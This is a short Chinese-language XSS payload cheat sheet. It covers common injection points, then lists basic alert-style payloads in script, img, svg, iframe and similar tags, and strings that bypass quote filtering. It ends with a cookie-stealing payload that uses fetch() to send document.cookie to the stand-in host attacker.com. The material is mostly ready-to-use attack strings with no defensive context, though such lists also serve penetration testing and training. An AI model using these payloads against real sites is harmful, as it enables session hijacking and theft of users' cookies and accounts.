# 跨站脚本 (XSS)

## 适用场景

搜索框、评论区、用户资料等展示用户输入的地方。

## 常用 Payload

### 基本 Payload

```html
<script>alert(1)</script>
<script>prompt(1)</script>
<script>confirm(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)"></iframe>
<marquee onstart=alert(1)>
javascript:alert(1)
```

### 绕过引号过滤

```html
'-alert(1)-'
'"><script>alert(1)</script>
';alert(1);//
```

### 窃取 Cookie

```html
<script>fetch('http://attacker.com?c='+document.cookie)</script>
```